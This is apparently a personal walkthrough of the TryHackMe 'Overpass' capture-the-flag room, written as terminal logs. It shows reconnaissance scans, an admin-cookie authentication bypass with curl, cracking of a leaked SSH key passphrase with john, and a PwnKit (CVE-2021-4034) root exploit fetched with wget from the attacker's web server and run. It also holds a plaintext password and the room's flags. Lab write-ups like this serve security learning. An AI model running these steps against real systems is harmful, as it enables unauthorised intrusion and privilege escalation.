@@ -1,0 +1,408 @@
+└─$ cat nmap_full.txt 
+# Nmap 7.95 scan initiated Mon Jul 14 00:12:55 2025 as: /usr/lib/nmap/nmap --privileged -sV -v -T4 -p- -oN nmap_full.txt 10.10.25.152
+Nmap scan report for 10.10.25.152
+Host is up (0.068s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Read data files from: /usr/share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Mon Jul 14 00:13:38 2025 -- 1 IP address (1 host up) scanned in 43.36 seconds
+
+
+
+
+└─$ gobuster dir -u http://10.10.25.152 -w /usr/share/wordlists/dirb/common.txt -t 50 -o gobuster_dirb.txt 
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.25.152
+[+] Method:                  GET
+[+] Threads:                 50
+[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/aboutus              (Status: 301) [Size: 0] [--> aboutus/]
+/admin                (Status: 301) [Size: 42] [--> /admin/]
+/css                  (Status: 301) [Size: 0] [--> css/]
+/downloads            (Status: 301) [Size: 0] [--> downloads/]
+/img                  (Status: 301) [Size: 0] [--> img/]
+/index.html           (Status: 301) [Size: 0] [--> ./]
+Progress: 4614 / 4615 (99.98%)
+===============================================================
+Finished
+===============================================================
+
+
+
+
+Our Staff
+-------------------------------
+Ninja - Lead Developer
+Pars - Shibe Enthusiast and Emotional Support Animal Manager
+Szymex - Head Of Security
+Bee - Chief Drinking Water Coordinator
+MuirlandOracle - Cryptography Consultant
+
+===============================================================
+ninja
+pars
+szymex
+bee
+muirlandoracle
+
+ROT47(username)
+
+?:?;2
+A2CD
+DKJ>6I
+366
+>F:C=2?5@C24=6
+===============================================================
+
+
+//Secure encryption algorithm from https://socketloop.com/tutorials/golang-rotate-47-caesar-cipher-by-47-characters-example
+
+
+ROT47
+
+
+└─$ nmap --script http-methods -p80 10.10.10.16
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-14 07:52 EDT
+Nmap scan report for 10.10.10.16
+Host is up (0.052s latency).
+
+PORT   STATE SERVICE
+80/tcp open  http
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+
+
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.10.16/api/
+[+] Method:                  GET
+[+] Threads:                 50
+[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/api/api-endpoints-res.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Extensions:              json,txt,php
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/index.html           (Status: 301) [Size: 0] [--> ./]
+/swagger/index.html   (Status: 301) [Size: 0] [--> ./]
+/swagger/static/index.html (Status: 301) [Size: 0] [--> ./]
+
+
+/http%3A%2F%2Fwww     (Status: 301) [Size: 0] [--> /swagger/http:/www]
+/http%3A%2F%2Fyoutube (Status: 301) [Size: 0] [--> /swagger/http:/youtube]
+/http%3A%2F%2Fblogs   (Status: 301) [Size: 0] [--> /swagger/http:/blogs]
+/http%3A%2F%2Fblog    (Status: 301) [Size: 0] [--> /swagger/http:/blog]
+/**http%3A%2F%2Fwww   (Status: 301) [Size: 0] [--> /swagger/%2A%2Ahttp:/www]
+/http%3A%2F%2Fcommunity (Status: 301) [Size: 0] [--> /swagger/http:/community]
+/http%3A%2F%2Fradar   (Status: 301) [Size: 0] [--> /swagger/http:/radar]
+/http%3A%2F%2Fjeremiahgrossman (Status: 301) [Size: 0] [--> /swagger/http:/jeremiahgrossman]
+/http%3A%2F%2Fweblog  (Status: 301) [Size: 0] [--> /swagger/http:/weblog]
+/http%3A%2F%2Fswik    (Status: 301) [Size: 0] [--> /swagger/http:/swik]
+
+
+
+
+└─$ nikto -h http://10.10.10.16                
+- Nikto v2.5.0
+---------------------------------------------------------------------------
++ Target IP:          10.10.10.16
++ Target Hostname:    10.10.10.16
++ Target Port:        80
++ Start Time:         2025-07-14 08:11:09 (GMT-4)
+---------------------------------------------------------------------------
++ Server: No banner retrieved
++ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
++ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ /: Web Server returns a valid response with junk HTTP methods which may cause false positives.
++ /admin.html: This might be interesting.
++ /admin/: This might be interesting.
++ /css/: This might be interesting.
++ /downloads/: This might be interesting.
++ /img/: This might be interesting.
++ 8047 requests: 0 error(s) and 8 item(s) reported on remote host
++ End Time:           2025-07-14 08:18:14 (GMT-4) (425 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+
+
+
+─$ curl -H "Cookie: SessionToken=admin" http://10.10.10.16/admin/
+
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <title>Overpass</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" type="text/css" media="screen" href="/css/main.css">
+    <link rel="icon" 
+      type="image/png" 
+      href="/img/overpass.png" />
+    <script src="/main.js"></script>
+</head>
+
+<body>
+    <nav>
+        <img class="logo" src="/img/overpass.svg" alt="Overpass logo">
+        <h2 class="navTitle"><a href="/">Overpass</a></h2>
+        <a href="/aboutus">About Us</a>
+        <a href="/downloads">Downloads</a>
+    </nav>
+    <h1 class="pageHeading content">Welcome to the Overpass Administrator area</h1>
+    <h3 class="subtitle content">A secure password manager with support for Windows, Linux, MacOS and more</h3>
+    <div class="bodyFlexContainer content">
+        <div>
+            <p>Since you keep forgetting your password, James, I've set up SSH keys for you.</p>
+            <p>If you forget the password for this, crack it yourself. I'm tired of fixing stuff for you.<br>
+                Also, we really need to talk about this "Military Grade" encryption. - Paradox</p>
+            <pre>-----BEGIN RSA PRIVATE KEY-----
+Proc-Type: 4,ENCRYPTED
+DEK-Info: AES-128-CBC,9F85D92F34F42626F13A7493AB48F337
+
+LNu5wQBBz7pKZ3cc4TWlxIUuD/opJi1DVpPa06pwiHHhe8Zjw3/v+xnmtS3O+qiN
+JHnLS8oUVR6Smosw4pqLGcP3AwKvrzDWtw2ycO7mNdNszwLp3uto7ENdTIbzvJal
+73/eUN9kYF0ua9rZC6mwoI2iG6sdlNL4ZqsYY7rrvDxeCZJkgzQGzkB9wKgw1ljT
+WDyy8qncljugOIf8QrHoo30Gv+dAMfipTSR43FGBZ/Hha4jDykUXP0PvuFyTbVdv
+BMXmr3xuKkB6I6k/jLjqWcLrhPWS0qRJ718G/u8cqYX3oJmM0Oo3jgoXYXxewGSZ
+AL5bLQFhZJNGoZ+N5nHOll1OBl1tmsUIRwYK7wT/9kvUiL3rhkBURhVIbj2qiHxR
+3KwmS4Dm4AOtoPTIAmVyaKmCWopf6le1+wzZ/UprNCAgeGTlZKX/joruW7ZJuAUf
+ABbRLLwFVPMgahrBp6vRfNECSxztbFmXPoVwvWRQ98Z+p8MiOoReb7Jfusy6GvZk
+VfW2gpmkAr8yDQynUukoWexPeDHWiSlg1kRJKrQP7GCupvW/r/Yc1RmNTfzT5eeR
+OkUOTMqmd3Lj07yELyavlBHrz5FJvzPM3rimRwEsl8GH111D4L5rAKVcusdFcg8P
+9BQukWbzVZHbaQtAGVGy0FKJv1WhA+pjTLqwU+c15WF7ENb3Dm5qdUoSSlPzRjze
+eaPG5O4U9Fq0ZaYPkMlyJCzRVp43De4KKkyO5FQ+xSxce3FW0b63+8REgYirOGcZ
+4TBApY+uz34JXe8jElhrKV9xw/7zG2LokKMnljG2YFIApr99nZFVZs1XOFCCkcM8
+GFheoT4yFwrXhU1fjQjW/cR0kbhOv7RfV5x7L36x3ZuCfBdlWkt/h2M5nowjcbYn
+exxOuOdqdazTjrXOyRNyOtYF9WPLhLRHapBAkXzvNSOERB3TJca8ydbKsyasdCGy
+AIPX52bioBlDhg8DmPApR1C1zRYwT1LEFKt7KKAaogbw3G5raSzB54MQpX6WL+wk
+6p7/wOX6WMo1MlkF95M3C7dxPFEspLHfpBxf2qys9MqBsd0rLkXoYR6gpbGbAW58
+dPm51MekHD+WeP8oTYGI4PVCS/WF+U90Gty0UmgyI9qfxMVIu1BcmJhzh8gdtT0i
+n0Lz5pKY+rLxdUaAA9KVwFsdiXnXjHEE1UwnDqqrvgBuvX6Nux+hfgXi9Bsy68qT
+8HiUKTEsukcv/IYHK1s+Uw/H5AWtJsFmWQs3bw+Y4iw+YLZomXA4E7yxPXyfWm4K
+4FMg3ng0e4/7HRYJSaXLQOKeNwcf/LW5dipO7DmBjVLsC8eyJ8ujeutP/GcA5l6z
+ylqilOgj4+yiS813kNTjCJOwKRsXg2jKbnRa8b7dSRz7aDZVLpJnEy9bhn6a7WtS
+49TxToi53ZB14+ougkL4svJyYYIRuQjrUmierXAdmbYF9wimhmLfelrMcofOHRW2
++hL1kHlTtJZU8Zj2Y2Y3hd6yRNJcIgCDrmLbn9C5M0d7g0h2BlFaJIZOYDS6J6Yk
+2cWk/Mln7+OhAApAvDBKVM7/LGR9/sVPceEos6HTfBXbmsiV+eoFzUtujtymv8U7
+-----END RSA PRIVATE KEY-----</pre>
+        </div>
+    </div>
+</body>
+
+</html>                                              
+
+
+Welcome to the Overpass Administrator area
+A secure password manager with support for Windows, Linux, MacOS and more
+
+Since you keep forgetting your password, James, I've set up SSH keys for you.
+
+If you forget the password for this, crack it yourself. I'm tired of fixing stuff for you.
+Also, we really need to talk about this "Military Grade" encryption. - Paradox
+
+-----BEGIN RSA PRIVATE KEY-----
+Proc-Type: 4,ENCRYPTED
+DEK-Info: AES-128-CBC,9F85D92F34F42626F13A7493AB48F337
+
+LNu5wQBBz7pKZ3cc4TWlxIUuD/opJi1DVpPa06pwiHHhe8Zjw3/v+xnmtS3O+qiN
+JHnLS8oUVR6Smosw4pqLGcP3AwKvrzDWtw2ycO7mNdNszwLp3uto7ENdTIbzvJal
+73/eUN9kYF0ua9rZC6mwoI2iG6sdlNL4ZqsYY7rrvDxeCZJkgzQGzkB9wKgw1ljT
+WDyy8qncljugOIf8QrHoo30Gv+dAMfipTSR43FGBZ/Hha4jDykUXP0PvuFyTbVdv
+BMXmr3xuKkB6I6k/jLjqWcLrhPWS0qRJ718G/u8cqYX3oJmM0Oo3jgoXYXxewGSZ
+AL5bLQFhZJNGoZ+N5nHOll1OBl1tmsUIRwYK7wT/9kvUiL3rhkBURhVIbj2qiHxR
+3KwmS4Dm4AOtoPTIAmVyaKmCWopf6le1+wzZ/UprNCAgeGTlZKX/joruW7ZJuAUf
+ABbRLLwFVPMgahrBp6vRfNECSxztbFmXPoVwvWRQ98Z+p8MiOoReb7Jfusy6GvZk
+VfW2gpmkAr8yDQynUukoWexPeDHWiSlg1kRJKrQP7GCupvW/r/Yc1RmNTfzT5eeR
+OkUOTMqmd3Lj07yELyavlBHrz5FJvzPM3rimRwEsl8GH111D4L5rAKVcusdFcg8P
+9BQukWbzVZHbaQtAGVGy0FKJv1WhA+pjTLqwU+c15WF7ENb3Dm5qdUoSSlPzRjze
+eaPG5O4U9Fq0ZaYPkMlyJCzRVp43De4KKkyO5FQ+xSxce3FW0b63+8REgYirOGcZ
+4TBApY+uz34JXe8jElhrKV9xw/7zG2LokKMnljG2YFIApr99nZFVZs1XOFCCkcM8
+GFheoT4yFwrXhU1fjQjW/cR0kbhOv7RfV5x7L36x3ZuCfBdlWkt/h2M5nowjcbYn
+exxOuOdqdazTjrXOyRNyOtYF9WPLhLRHapBAkXzvNSOERB3TJca8ydbKsyasdCGy
+AIPX52bioBlDhg8DmPApR1C1zRYwT1LEFKt7KKAaogbw3G5raSzB54MQpX6WL+wk
+6p7/wOX6WMo1MlkF95M3C7dxPFEspLHfpBxf2qys9MqBsd0rLkXoYR6gpbGbAW58
+dPm51MekHD+WeP8oTYGI4PVCS/WF+U90Gty0UmgyI9qfxMVIu1BcmJhzh8gdtT0i
+n0Lz5pKY+rLxdUaAA9KVwFsdiXnXjHEE1UwnDqqrvgBuvX6Nux+hfgXi9Bsy68qT
+8HiUKTEsukcv/IYHK1s+Uw/H5AWtJsFmWQs3bw+Y4iw+YLZomXA4E7yxPXyfWm4K
+4FMg3ng0e4/7HRYJSaXLQOKeNwcf/LW5dipO7DmBjVLsC8eyJ8ujeutP/GcA5l6z
+ylqilOgj4+yiS813kNTjCJOwKRsXg2jKbnRa8b7dSRz7aDZVLpJnEy9bhn6a7WtS
+49TxToi53ZB14+ougkL4svJyYYIRuQjrUmierXAdmbYF9wimhmLfelrMcofOHRW2
++hL1kHlTtJZU8Zj2Y2Y3hd6yRNJcIgCDrmLbn9C5M0d7g0h2BlFaJIZOYDS6J6Yk
+2cWk/Mln7+OhAApAvDBKVM7/LGR9/sVPceEos6HTfBXbmsiV+eoFzUtujtymv8U7
+-----END RSA PRIVATE KEY-----
+
+
+
+
+┌──(kali㉿kali)-[~/github/tryhackme/overpass/loot]
+└─$ ssh2john james_rsa_key.txt > james_key.hash    
+
+
+
+
+└─$ john --wordlist=/usr/share/wordlists/rockyou.txt james_key.hash 
+Using default input encoding: UTF-8
+Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
+Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
+Cost 2 (iteration count) is 1 for all loaded hashes
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+james13          (james_rsa_key.txt)     
+1g 0:00:00:00 DONE (2025-07-14 09:04) 33.33g/s 445866p/s 445866c/s 445866C/s pink25..honolulu
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+
+
+rsa key pass: james13
+
+┌──(kali㉿kali)-[~/github/tryhackme/overpass/loot]
+└─$ chmod 600 james.key           
+                                                                                                                           
+┌──(kali㉿kali)-[~/github/tryhackme/overpass/loot]
+└─$ ssh -i james.key james@10.10.10.16
+Enter passphrase for key 'james.key': 
+Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-108-generic x86_64)
+
+
+
+james@overpass-prod:~$ cat user.txt
+thm{65c1aaf000506e56996822c6281e6bf7}
+
+
+james@overpass-prod:~$ find / -perm -4000 -type f 2>/dev/null
+/bin/fusermount
+/bin/umount
+/bin/su
+/bin/mount
+/bin/ping
+/usr/bin/chfn
+/usr/bin/at
+/usr/bin/chsh
+/usr/bin/sudo
+/usr/bin/passwd
+/usr/bin/pkexec
+/usr/bin/traceroute6.iputils
+/usr/bin/newgrp
+/usr/bin/gpasswd
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/openssh/ssh-keysign
+
+
+james@overpass-prod:~$ cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
+syslog:x:102:106::/home/syslog:/usr/sbin/nologin
+messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
+_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
+lxd:x:105:65534::/var/lib/lxd/:/bin/false
+uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
+dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
+pollinate:x:109:1::/var/cache/pollinate:/bin/false
+sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
+tryhackme:x:1000:1000:tryhackme:/home/tryhackme:/bin/bash
+james:x:1001:1001:,,,:/home/james:/bin/bash
+
+
+james:saydrawnlyingpicture
+
+https://github.com/PwnFunction/CVE-2021-4034
+
+download the zip file from Github
+
+extract it and create a tar file
+
+open a python web server
+
+python3 -m http.server 9000
+
+send tar to target machine
+
+james@overpass-prod:~/pwnkit$ wget http://10.14.106.115:9000/CVE-2021-4034-main.tar
+
+james@overpass-prod:~/pwnkit$ tar xfv CVE-2021-4034-main.tar 
+CVE-2021-4034-main/
+CVE-2021-4034-main/conversion-mod.c
+CVE-2021-4034-main/Dockerfile
+CVE-2021-4034-main/pwnkit.c
+CVE-2021-4034-main/Makefile
+CVE-2021-4034-main/README.md
+
+james@overpass-prod:~/pwnkit/CVE-2021-4034-main$ make all && ./pwnkit && make clean
+rm -rf 'GCONV_PATH=.' pwn pwnkit
+mkdir 'GCONV_PATH=.'
+touch GCONV_PATH=.\/pwn
+chmod +x GCONV_PATH=.\/pwn
+mkdir pwn
+echo 'module  UTF-8//    BRUH//    conversion-mod   1' > pwn/gconv-modules
+gcc -shared -fPIC -o pwn/conversion-mod.so conversion-mod.c
+gcc -o pwnkit pwnkit.c
+# cd /root
+# ls -al
+total 60
+drwx------  8 root root  4096 Jun 27  2020 .
+drwxr-xr-x 23 root root  4096 Jun 27  2020 ..
+lrwxrwxrwx  1 root root     9 Jun 27  2020 .bash_history -> /dev/null
+-rw-------  1 root root  3106 Apr  9  2018 .bashrc
+drwx------  3 root root  4096 Jun 27  2020 .cache
+drwx------  3 root root  4096 Jun 27  2020 .local
+-rw-------  1 root root   184 Jun 27  2020 .profile
+drwx------  2 root root  4096 Jun 27  2020 .ssh
+-rw-r--r--  1 root root 15778 Jul 14 13:21 buildStatus
+drwx------  2 root root  4096 Jun 27  2020 builds
+drwxr-xr-x  4 root root  4096 Jun 27  2020 go
+-rw-------  1 root root    38 Jun 27  2020 root.txt
+drwx------  2 root root  4096 Jun 27  2020 src
+# cat root.txt
+thm{7f336f8c359dbac18d54fdd64ea753bb}
+# 
+
+
+
+
+
+
+
+
+
